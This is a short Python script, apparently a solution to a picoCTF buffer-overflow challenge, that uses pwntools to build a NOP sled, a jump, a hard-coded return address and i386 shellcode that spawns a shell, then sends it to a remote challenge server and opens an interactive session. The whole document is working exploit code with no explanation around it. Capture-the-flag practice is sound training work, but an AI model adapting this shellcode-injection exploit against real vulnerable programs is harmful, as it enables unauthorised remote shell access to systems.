import pwn
import sys

payload = b'\x90' * 26
payload += b'\xeb\x04'
payload += pwn.p32(0x0805333b)

payload += pwn.asm(pwn.shellcraft.i386.linux.sh())

p = pwn.remote('saturn.picoctf.net', 62081)

p.sendline(payload)

p.interactive()